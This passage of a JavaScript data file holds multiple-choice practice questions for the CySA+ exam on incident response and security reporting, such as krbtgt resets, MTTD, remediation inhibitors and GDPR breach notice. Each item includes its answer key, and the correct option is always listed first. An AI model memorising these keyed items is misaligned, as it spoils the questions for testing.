  { id: "ir19", d: "ir", q: "Which Windows artifact best helps establish whether, and when, a suspicious executable was run?", o: ["Prefetch files", "The hosts file", "The desktop wallpaper setting", "The printer spooler queue"], a: 0, x: "Prefetch files record that a program ran, with its run count and last run times, so they're key for building a timeline. Amcache and Shimcache are other common execution artifacts." },
  { id: "ir20", d: "ir", q: "Attackers held domain admin rights and may have forged Kerberos golden tickets. Which eradication step addresses this?", o: ["Reset the krbtgt account password twice, along with all privileged credentials", "Reboot every domain controller", "Delete and recreate all user accounts", "Disable NTLM logging"], a: 0, x: "Golden tickets are signed with the krbtgt key, which keeps both its current and previous password. Resetting it twice, allowing for replication, invalidates forged tickets." },

  // 4.0 Reporting and Communication
  { id: "rc1", d: "rc", q: "Which metric measures the average time between a threat entering the environment and the security team discovering it?", o: ["Mean time to detect (MTTD)", "Mean time to respond (MTTR)", "Mean time between failures (MTBF)", "Recovery time objective (RTO)"], a: 0, x: "MTTD tracks how quickly you detect, and MTTR how quickly you respond or remediate. Both are core SOC KPIs and are expected to fall as the program matures." },
  { id: "rc2", d: "rc", q: "A system owner refuses to apply a critical patch because the server supports a 24/7 order system with a strict uptime SLA. What is this called in vulnerability reporting?", o: ["A remediation inhibitor: business process interruption", "A false positive", "A compensating control", "Risk transference"], a: 0, x: "CySA+ lists inhibitors to remediation, such as MOUs and SLAs, organizational governance, business process interruption, degraded functionality, legacy and proprietary systems. Document them and propose compensating controls or a maintenance window." },
  { id: "rc3", d: "rc", q: "Who is the primary audience for an incident report's executive summary, and what should it emphasize?", o: ["Senior leadership; business impact, risk and decisions needed", "SOC analysts; IOCs and log excerpts", "Developers; code-level root cause", "Auditors; raw evidence hashes"], a: 0, x: "Executives need brief, non-technical content: what happened, the impact on the business, current status and what's needed from them. The technical detail goes in the body and appendices." },
  { id: "rc4", d: "rc", q: "The attacker may have access to corporate email during an incident. How should the response team communicate?", o: ["Use a pre-arranged out-of-band channel", "Continue using corporate email but encrypt messages", "Post updates on the internal wiki", "Delay all communication until eradication"], a: 0, x: "If the primary channels may be compromised, use out-of-band communication agreed during Preparation, such as a separate messaging platform or phone bridge, so the adversary can't watch the response." },
  { id: "rc5", d: "rc", q: "A breach may involve customer personal data. Who should be involved before any external notification is made?", o: ["Legal counsel (and PR/communications)", "Only the SOC manager", "The affected customers' banks", "The vulnerability scanning vendor"], a: 0, x: "Breach-notification rules such as GDPR's 72 hours, state laws and HIPAA have legal requirements. Legal decides obligations and timing, and PR/communications coordinates consistent public messaging." },
  { id: "rc6", d: "rc", q: "Which section of a lessons-learned report explains why the incident was possible in the first place?", o: ["Root cause analysis", "Executive summary", "Timeline of events", "Evidence log"], a: 0, x: "Root cause analysis finds the underlying failure, such as an unpatched VPN or missing MFA. Its findings drive the action plan so the incident doesn't happen again." },
  { id: "rc7", d: "rc", q: "Which is the best KPI for a vulnerability management program's effectiveness?", o: ["Percentage of critical vulnerabilities remediated within SLA", "Total number of scans run per month", "Number of scanner licenses purchased", "Number of plugins in the scanner"], a: 0, x: "Outcome metrics such as SLA compliance, mean time to remediate, and recurrence rate show effectiveness. Activity counts like the number of scans run don't show reduced risk." },
  { id: "rc8", d: "rc", q: "A vulnerability report lists 4,000 findings with no context. What change would make it most actionable for system owners?", o: ["Prioritize by risk (severity, exploitability, asset criticality) and assign owners and due dates", "Sort the findings alphabetically by plugin name", "Remove all low-severity findings without review", "Add more raw scanner output"], a: 0, x: "Actionable reports are risk-ranked, grouped by owner or asset, and include remediation steps and deadlines. Prioritization combines CVSS, threat intel such as KEV and EPSS, and business criticality." },
  { id: "rc9", d: "rc", q: "During an incident, a junior analyst gets a call from a reporter asking for details. What should they do?", o: ["Decline to comment and refer the reporter to the designated communications contact", "Share only confirmed facts", "Confirm the incident but give no details", "Forward the reporter to the CISO's personal phone"], a: 0, x: "The communication plan names who may speak externally. Everyone else redirects. Uncoordinated disclosure can create legal, regulatory and reputational damage." },
  { id: "rc10", d: "rc", q: "Which item belongs in a post-incident action plan?", o: ["Enforce MFA on remote access and schedule awareness training", "Reimage the infected host", "Capture a memory dump", "Block the attacker's IP at the firewall"], a: 0, x: "Action plans address root causes and improvements over time, such as configuration management, patching cadence, training and new controls. The other choices are immediate response actions." },
  { id: "rc11", d: "rc", q: "A hospital's imaging workstation runs an outdated OS, but the vendor's support contract forbids patching it without vendor certification. Which remediation inhibitor is this?", o: ["Proprietary systems", "Organizational governance", "Degraded functionality", "Memorandum of understanding"], a: 0, x: "Vendor-controlled systems that the organization can't legally or technically modify are the proprietary systems inhibitor. Report them with compensating controls such as segmentation and monitoring." },
  { id: "rc12", d: "rc", q: "Quarterly reports show the same vulnerabilities coming back on newly built servers after being fixed. What is the most likely cause?", o: ["The base image used to build servers is not patched or hardened", "The scanner is producing false negatives", "Users are reinstalling old software on purpose", "The SLA for critical findings is too long"], a: 0, x: "A high recurrence rate means the fix isn't reaching the source. Update the golden image or configuration baseline so new builds start patched." },
  { id: "rc13", d: "rc", q: "An incident suggests an employee is stealing customer data. Besides legal counsel, which stakeholder should be involved early?", o: ["Human resources", "The marketing team", "The external auditor", "The employee's direct reports"], a: 0, x: "Insider cases have employment and privacy implications. HR and legal guide how evidence is gathered and how the employee is handled, so the response stays fair and defensible." },
  { id: "rc14", d: "rc", q: "Leadership asks whether vulnerability risk is going down over the year. What is the best way to show this?", o: ["A trend line of open critical and high vulnerabilities over time", "A table of every finding's plugin ID", "A single pie chart of this month's findings", "The raw scanner export"], a: 0, x: "Trend metrics show direction and progress over time, which is what leaders want to know. A single snapshot or raw data can't answer whether things are improving." },
  { id: "rc15", d: "rc", q: "Why should an incident timeline normalize all timestamps to a single time zone such as UTC?", o: ["So events from systems in different time zones can be ordered and correlated correctly", "Because UTC timestamps are legally required in every country", "To make the report shorter", "Because log files can't store local time"], a: 0, x: "Mixed time zones and daylight-saving shifts can reorder events and hide cause and effect. A single reference time keeps the timeline accurate and easy to defend." },
  { id: "rc16", d: "rc", q: "According to NIST SP 800-61, when should the lessons-learned meeting for a major incident be held?", o: ["Within several days after the incident ends, with the people involved", "Only at the annual security review", "Before containment begins", "Only if the incident caused financial loss"], a: 0, x: "Holding it soon, while details are fresh, gives accurate input on what worked, what didn't and what to change. Its outcomes feed the Preparation phase." },
  { id: "rc17", d: "rc", q: "Under the EU GDPR, how soon must a data controller usually notify the supervisory authority of a personal data breach after becoming aware of it?", o: ["Within 72 hours, where feasible", "Within 24 hours", "Within 30 days", "Only if customers complain"], a: 0, x: "GDPR Article 33 requires notification without undue delay and, where feasible, within 72 hours of awareness, unless the breach is unlikely to risk people's rights and freedoms. Late notifications must explain the delay." }
];
